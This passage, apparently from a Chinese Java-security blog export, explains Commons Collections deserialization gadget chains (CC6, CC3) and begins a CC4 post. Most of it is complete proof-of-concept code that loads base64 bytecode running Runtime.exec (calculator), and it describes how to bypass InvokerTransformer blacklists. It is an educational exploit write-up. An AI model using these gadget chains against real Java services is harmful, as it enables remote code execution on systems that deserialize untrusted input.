2AAZXsQAAAAIACwAAAA4AAwAAABsABAAcAA0AHQAMAAAADAABAAAADgAVABAAAAARAAAABAABABIAAQAiAAAAAgAj&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">TemplatesImpl</span> <span class=\"variable\">templates</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TemplatesImpl</span>();</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_class&quot;</span>,<span class=\"literal\">null</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_name&quot;</span>,<span class=\"string\">&quot;qqq&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_bytecodes&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[][]&#123;codes&#125;);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_tfactory&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">TransformerFactoryImpl</span>());</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(templates),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">InvokerTransformer</span>(<span class=\"string\">&quot;newTransformer&quot;</span>,<span class=\"literal\">null</span>,<span class=\"literal\">null</span>)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span> <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; hashMap = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap, <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantFactory</span>(<span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">TiedMapEntry</span> <span class=\"variable\">tiedMapEntry</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TiedMapEntry</span>(lazyMap, <span class=\"string\">&quot;qwe&quot;</span>);</span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; objcc6 = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\">        objcc6.put(tiedMapEntry,<span class=\"string\">&quot;asd&quot;</span>);</span><br><span class=\"line\">        lazyMap.remove(<span class=\"string\">&quot;qwe&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> LazyMap.class;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">factoryField</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        factoryField = c.getDeclaredField(<span class=\"string\">&quot;factory&quot;</span>);</span><br><span class=\"line\">        factoryField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        factoryField.set(lazyMap,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(objcc6);</span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;cc6.bin&quot;</span>));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;cc6.bin&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setFieldValue</span><span class=\"params\">(Object obj, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"CArk36eq_oJ7Gd9wNNPza80nK6gvmBi9gPlZy306E9M.png\" alt=\"image\"></p>\n<p>以上就是cc1和cc6修改了执行命令方式后的利用链</p>\n<h2 id=\"cc3的出现\"><a href=\"#cc3的出现\" class=\"headerlink\" title=\"cc3的出现\"></a>cc3的出现</h2><p>我们发现上面的cc1和cc6都有一个共同的特点就是都用到了InvokerTransformer；如今在很多防护中早已经把InvokerTransformer放进黑名单，这时我们不得不寻找一个新的利用链进行绕过。</p>\n<p>我们知道在TemplatesImpl执行命令中是调用newTransformer来实例化的，我们再看看还有没有其它地方调用它的。</p>\n<p>于是在TrAXFilter的构造函数中发现有调用templates.newTransformer()的</p>\n<p><img src=\"NNffSds5zSPf7LLuO2gDRmS_ErbS-NlgPQRt9VodmCE.png\" alt=\"image\"></p>\n<p><img src=\"eCmjcH8jvhbxedz_rN-ymAjpuEPsTFSwQFtf7BWHH2E.png\" alt=\"image\"></p>\n<p>那么如果我们可以调用TrAXFilter的构造函数的话，我们也可以执行代码。但是这个类没有继承序列化的接口，我们不能对其进行序列化。</p>\n<p>但是在InstantiateTransformer类的transform方法可以调用我们指定类的构造函数。</p>\n<p>代码功能大致为：判断输入的对象是否是一个类（Class）的实例，如果不是，则抛出异常；<br>获取输入类对象的构造函数（Constructor）；<br>使用获取到的构造函数实例化一个对象，并返回。</p>\n<p><img src=\"WNqiNFnac6l18sSPPEleMj3Cf3QCeDOhYHo5uI9DNt0.png\" alt=\"image\"></p>\n<p>分析一下如何使用的，分别传入类和参数。</p>\n<p><img src=\"w_R3e9ZCk8bmILTjA0DGJSYy6FUOUKbznewtAKXgMnc.png\" alt=\"image\"></p>\n<p>构造之后得到了不需要使用newTransformer实例化的执行命令方式</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain3;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.xml.transform.Templates;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">cc3</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] codes = Base64.getDecoder().decode(<span class=\"string\">&quot;yv66vgAAADQAMgcAJAoAAQAlCgAHACUKACYAJwgAKAoAJgApBwAqAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAlieXRlQ2xhc3MBACBMY29tL2dhcmNrM2gvY2NDaGFpbjMvQnl0ZUNsYXNzOwEACkV4Y2VwdGlvbnMHACsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAR0aGlzAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALAEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ+AQADKClWAQAKU291cmNlRmlsZQEADkJ5dGVDbGFzcy5qYXZhAQAeY29tL2dhcmNrM2gvY2NDaGFpbjMvQnl0ZUNsYXNzDAAgACEHAC0MAC4ALwEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMADAAMQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAAJAAgACQACAAoAAABBAAIAAgAAAAm7AAFZtwACTLEAAAACAAsAAAAKAAIAAAATAAgAFAAMAAAAFgACAAAACQANAA4AAAAIAAEADwAQAAEAEQAAAAQAAQASAAEAEwAUAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAXAAwAAAAgAAMAAAABABUAEAAAAAAAAQAWABcAAQAAAAEAGAAZAAIAEQAAAAQAAQAaAAEAEwAbAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAaAAwAAAAqAAQAAAABABUAEAAAAAAAAQAWABcAAQAAAAEAHAAdAAIAAAABAB4AHwADABEAAAAEAAEAGgABACAAIQACAAoAAABAAAIAAQAAAA4qtwADuAAEEgW2AAZXsQAAAAIACwAAAA4AAwAAABsABAAcAA0AHQAMAAAADAABAAAADgAVABAAAAARAAAABAABABIAAQAiAAAAAgAj&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">TemplatesImpl</span> <span class=\"variable\">templates</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TemplatesImpl</span>();</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_class&quot;</span>,<span class=\"literal\">null</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_name&quot;</span>,<span class=\"string\">&quot;xxx&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_bytecodes&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[][]&#123;codes&#125;);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_tfactory&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">TransformerFactoryImpl</span>());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//旧的实例化</span></span><br><span class=\"line\">        <span class=\"comment\">//templates.newTransformer();</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//新的实例化</span></span><br><span class=\"line\">        <span class=\"type\">InstantiateTransformer</span> <span class=\"variable\">instantiateTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InstantiateTransformer</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Templates.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;templates&#125;);</span><br><span class=\"line\">        instantiateTransformer.transform(TrAXFilter.class);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setFieldValue</span><span class=\"params\">(Object obj, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"M8ep2_egT_BSGx2ddqttr9vXmUSE1cjVw-iqqDHUkcY.png\" alt=\"image\"></p>\n<p>经过修改之后得到了如下的poc，可不使用InvokerTransformer也可以加载恶意类来执行命令了</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.garck3h.ccChain3;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.xml.transform.Templates;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.annotation.Target;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Constructor;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">cc3</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">byte</span>[] codes = Base64.getDecoder().decode(<span class=\"string\">&quot;yv66vgAAADQAMgcAJAoAAQAlCgAHACUKACYAJwgAKAoAJgApBwAqAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEYXJncwEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAlieXRlQ2xhc3MBACBMY29tL2dhcmNrM2gvY2NDaGFpbjMvQnl0ZUNsYXNzOwEACkV4Y2VwdGlvbnMHACsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAR0aGlzAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcALAEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAGPGluaXQ+AQADKClWAQAKU291cmNlRmlsZQEADkJ5dGVDbGFzcy5qYXZhAQAeY29tL2dhcmNrM2gvY2NDaGFpbjMvQnl0ZUNsYXNzDAAgACEHAC0MAC4ALwEAFm9wZW4gLWEgQ2FsY3VsYXRvci5hcHAMADAAMQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAEABwAAAAAABAAJAAgACQACAAoAAABBAAIAAgAAAAm7AAFZtwACTLEAAAACAAsAAAAKAAIAAAATAAgAFAAMAAAAFgACAAAACQANAA4AAAAIAAEADwAQAAEAEQAAAAQAAQASAAEAEwAUAAIACgAAAD8AAAADAAAAAbEAAAACAAsAAAAGAAEAAAAXAAwAAAAgAAMAAAABABUAEAAAAAAAAQAWABcAAQAAAAEAGAAZAAIAEQAAAAQAAQAaAAEAEwAbAAIACgAAAEkAAAAEAAAAAbEAAAACAAsAAAAGAAEAAAAaAAwAAAAqAAQAAAABABUAEAAAAAAAAQAWABcAAQAAAAEAHAAdAAIAAAABAB4AHwADABEAAAAEAAEAGgABACAAIQACAAoAAABAAAIAAQAAAA4qtwADuAAEEgW2AAZXsQAAAAIACwAAAA4AAwAAABsABAAcAA0AHQAMAAAADAABAAAADgAVABAAAAARAAAABAABABIAAQAiAAAAAgAj&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">TemplatesImpl</span> <span class=\"variable\">templates</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">TemplatesImpl</span>();</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_class&quot;</span>,<span class=\"literal\">null</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_name&quot;</span>,<span class=\"string\">&quot;xxx&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_bytecodes&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">byte</span>[][]&#123;codes&#125;);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_tfactory&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">TransformerFactoryImpl</span>());</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">InstantiateTransformer</span> <span class=\"variable\">instantiateTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InstantiateTransformer</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Class</span>[]&#123;Templates.class&#125;,<span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;templates&#125;);</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> <span class=\"title class_\">Transformer</span>[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> <span class=\"title class_\">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class=\"line\">                instantiateTransformer</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">ChainedTransformer</span>  <span class=\"variable\">chainedTransformer</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ChainedTransformer</span>(transformers);</span><br><span class=\"line\">        HashMap&lt;Object,Object&gt; map =  <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">        map.put(<span class=\"string\">&quot;value&quot;</span>,<span class=\"string\">&quot;value&quot;</span>);</span><br><span class=\"line\">        Map&lt;Object,Object&gt; transformedMap=TransformedMap.decorate(map,<span class=\"literal\">null</span>,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class c=  Class.forName(<span class=\"string\">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class=\"line\">        Constructor constructor= c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class=\"line\"></span><br><span class=\"line\">        constructor.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        Object obj= constructor.newInstance(Target.class,transformedMap);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(obj);</span><br><span class=\"line\">        unserialize();</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectOutputStream</span> <span class=\"variable\">outputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectOutputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        outputStream.writeObject(obj);</span><br><span class=\"line\">        outputStream.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">unserialize</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span>  Exception&#123;</span><br><span class=\"line\">        <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">inputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ObjectInputStream</span>( <span class=\"keyword\">new</span> <span class=\"title class_\">FileInputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj</span> <span class=\"operator\">=</span> inputStream.readObject();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">setFieldValue</span><span class=\"params\">(Object obj, String fieldName, Object value)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">field</span> <span class=\"operator\">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class=\"line\">        field.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        field.set(obj, value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"WXjBwTw5OmFDRrZ8qN2udmNe-YuCxiS56zfyrwPrbBk.png\" alt=\"image\"></p>\n<p>cc3主要是修改了实例化的方式，然后调用TemplatesImpl动态加载类；前半部分可以继续使用cc1或者cc6的前半部分进行自由组合。</p>\n<p><img src=\"VX1G6SYa_JKHd19WSX8Fw96T-Wh5Th0sdcRPIfwGpZ8.png\" alt=\"image\"></p>\n<p>cc3的利用链大致为：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">cc3 chain:</span><br><span class=\"line\">        ObjectInputStream.readObject()</span><br><span class=\"line\">            AnnotationInvocationHandler.readObject()</span><br><span class=\"line\">                         TransformedMap.decorate()</span><br><span class=\"line\">                            Map(Proxy).entrySet()</span><br><span class=\"line\">                            MapEntry.setValue()</span><br><span class=\"line\">                            TransformedMap.checkSetValue()</span><br><span class=\"line\">​                              ChainedTransformer.transform()</span><br><span class=\"line\">​                                ConstantTransformer.transform()</span><br><span class=\"line\">                                InstantiateTransformer.transform()</span><br><span class=\"line\">                                    TrAXFilter.TrAXFilter()</span><br><span class=\"line\">                                        TemplatesImpl.newTransformer()</span><br><span class=\"line\">                                        defineClass</span><br><span class=\"line\">                                            newInstance</span><br></pre></td></tr></table></figure>\n<h2 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h2><p>1.这次主要是修改了cc1和cc6的命令执行方式，从传统的直接调用runtime执行命令到了加载恶意类执行代码从而执行命令。</p>\n<p>2.然后为了避免InvokerTransformer被禁用，使用了新的实例化的方式来实例化TemplatesImpl的newTransformer</p>\n<p>参考：<a href=\"https://www.bilibili.com/video/BV1Zf4y1F74K?t=1918.0\">https://www.bilibili.com/video/BV1Zf4y1F74K?t=1918.0</a></p>\n","categories":["Java安全"],"tags":["漏洞复现","反序列化","CC链"]},{"title":"Java安全之cc4,cc2,cc5,cc7","url":"/2023/08/15/Java%E5%AE%89%E5%85%A8%E4%B9%8Bcc4,cc2,cc5,cc7/","content":"<h1 id=\"Java安全之cc4-cc2-cc5-cc7\"><a href=\"#Java安全之cc4-cc2-cc5-cc7\" class=\"headerlink\" title=\"Java安全之cc4,cc2,cc5,cc7\"></a>Java安全之cc4,cc2,cc5,cc7</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>前面我们都是学的利用链使用commons.collections都是3版本的，我们今天来看一下4版本有哪些利用方式。下面我们会把cc4,cc2,cc5,cc7都进行探讨。</p>\n<p><em>声明：**文章中涉及的内容可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</em></p>\n<h2 id=\"CC4的出现\"><a href=\"#CC4的出现\" class=\"headerlink\" title=\"CC4的出现\"></a>CC4的出现</h2><p>这时候升级了commons-collections的版本到4，maven的配置如下</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class=\"line\">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class=\"line\">    &lt;version&gt;<span class=\"number\">4.0</span>&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n<p>我们来看一下commons-collections4的ChainedTransformer.transform</p>\n<p><img 